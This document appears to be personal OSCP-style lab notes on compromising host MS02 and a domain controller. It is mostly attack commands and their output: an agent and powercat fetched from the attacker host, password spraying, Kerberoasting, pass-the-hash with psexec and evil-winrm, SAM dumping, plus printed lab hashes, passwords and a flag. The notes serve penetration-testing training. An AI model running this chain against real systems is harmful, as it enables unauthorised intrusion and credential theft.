# MS02
- 10.10.158.142
## Connect
- connected through MS02 via ligolo-ng
```bash
proxy -selfcert		# KALI start ligolo-ng

curl.exe http://192.168.45.210/ligolo_agent.exe -o agent.exe        # WIN copy agent to windows target

./agent.exe -connect 192.168.45.210:11601 -ignore-cert       

session # KALI
autoroute
select subnet/route you want access to
create a new interface, start tunnel

# CLeanup if it gets fucked up
iflist
ifdel --name name_of_int
```

## CONNECTED!!
- quick nmap 
```
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
5985/tcp open  wsman

nxc smb 10.10.158.142 -u 'Eric.Wallows' -p 'EricLikesRunning800' --shares

 10.10.158.142:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
```
We were able to update our user.txt loot with a full directory users list 
```bash 
nxc smb 10.10.158.140 -u 'Eric.Wallows' -p 'EricLikesRunning800' --users-export ./oscp_users.txt

# password spray, not successful
nxc smb 10.10.158.142 -u users.txt  -p passwords.txt  --continue-on-success

# trying asreproast
impacket-GetNPUsers -dc-host dc01.oscp.exam -dc-ip 10.10.158.140 -usersfile ./loot/oscp_users.txt -request -format hashcat -outputfile asreproast.hash oscp.exam/

# attempted password spray via MSSQL, failed
nxc mssql 10.10.158.142 --local-auth -u 'sa'  -p  /usr/share/wordlists/rockyou.txt  --ignore-pw-decoding

# Attempt sql connection to 10.10.158.142
impacket-mssqlclient Eric.Wallows:EricLikesRunning800@10.10.158.142  -windows-auth
# Success!

SELECT * FROM msdb.information_schema.tables;
EXECUTE sp_configure 'show advanced options', 1;
# we don't have permissions for XP_CMDSHELl


```

```

# Example with smbclient
smbclient \\\\192.168.110.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
dir
get secrets.txt

# SYSTEM shell    0000000 bit is for the LM hash, which is empty
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.110.212
hostname
ipconfig
whoami
exit

### from MS01 mimikats sekurlsa  #####
celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd
Mary.Williams:9a3121977ee93af56ebd0ef4f527a35e

PtH?
impacket-psexec -hashes 00000000000000000000000000000000:e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@10.10.158.142 
# this worked but no rights?
smbclient \\\\10.10.158.142\\secrets -U celia.almeda --pw-nt-hash e728ecbadfb02f51ce8eed753f3ff3fd

# kerberroast
 impacket-GetUserSPNs -dc-host dc01.oscp.exam -dc-ip 10.10.158.140  oscp.exam/Eric.Wallows:'EricLikesRunning800' -request > kerberroast.hash

```
This cracked the web_svc account.
Adding to creds
web_svc:Diamond1
-  OMG FUCKING FINALLY!!
---

was able to use evil-winrm, to Pass-The-Hash of one of the users we dumped of ms01 but were unable to crack

---

```bash

evil-winrm -u celia.almeda  -H 'e728ecbadfb02f51ce8eed753f3ff3fd'  -i 10.10.158.142		# SUCCESS!!
# evil-winrm has build in upload functionality, using that instead .. 
# Upload is from directory evil-winrm was luanched in
upload winPEASx64.exe .

```

### pivotception!
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:4445 --tcp
IP : 10.10.158.142 
The pivot worked,  amazing
curl.exe http://10.10.158.141:30000/powercat.ps1 -o powercat.ps1

found SAM and SYSTEM in old windows backup/upgrade 
```
*Evil-WinRM* PS C:\windows.old\windows\system32> download SAM
*Evil-WinRM* PS C:\windows.old\windows\system32> download SYSTESM

secretsdump.py -sam SAM -system SYSTEM LOCAL

# can try the PTH command from the saisathvi1-oscp-cheetsheet
pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cbe81fe00 //10.129.26.210 cmd.exe

-UÂ JEEVES/administrator	Username/Domain	Specifies the user and domain for authentication.
%aad3b43...:e0fb1fb...	Hash Credentials	This is the crucial part: the NTLM hash pair used for authentication. The format is typically [LM_Hash]:[NT_Hash].
//10.129.26.210	Target Host	The IP address of the remote Windows machine where the command will be executed.
cmd.exe	Remote Command	The command to execute on the remote Windows machine. cmd.exe will launch a command-line shell session on the target.
```

# Attempting to crack.. striped leading LM piece and reomved trailing ::: 
john --wordlist='/home/kali/hacking/rockyou.txt'  --rules=best64 fixed.hashes --format=NT  
hashcat -m 1000  fixed.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# doesn't seem crackable.. letts try pth

we have the fucking hash for Tom_admin..!!  Maybe we can evil_winrm with these hashes to this box.. lets try

###############
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
######################

evil-winrm -u tom_admin -H '4979d69d4ca66955c075c41cf45f24dc'  -i 10.10.158.142

Holy shit it workeD!!!!!  I love evil-winrm


   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.158.142
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.158.254
*Evil-WinRM* PS C:\Users\tom_admin\Documents> hostname
MS02
*Evil-WinRM* PS C:\Users\tom_admin\Documents> whoami
oscp\tom_admin
*Evil-WinRM* PS C:\Users\tom_admin\Documents> 

Looking for a proof or something.. nothing.. fuck me
Get-ChildItem -Path C:\ -Include flag.txt, proof.txt,local.txt -Recurse -ErrorAction SilentlyContinue

# on DC!
evil-winrm -u tom_admin -H '4979d69d4ca66955c075c41cf45f24dc'  -i 10.10.158.140


*Evil-WinRM* PS C:\Users\administrator\desktop> hostname
DC01
*Evil-WinRM* PS C:\Users\administrator\desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.158.140
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.158.254
*Evil-WinRM* PS C:\Users\administrator\desktop> whoami
oscp\tom_admin
*Evil-WinRM* PS C:\Users\administrator\desktop> cat proof.txt
56298463d22beb0398907ea0d5e387a4






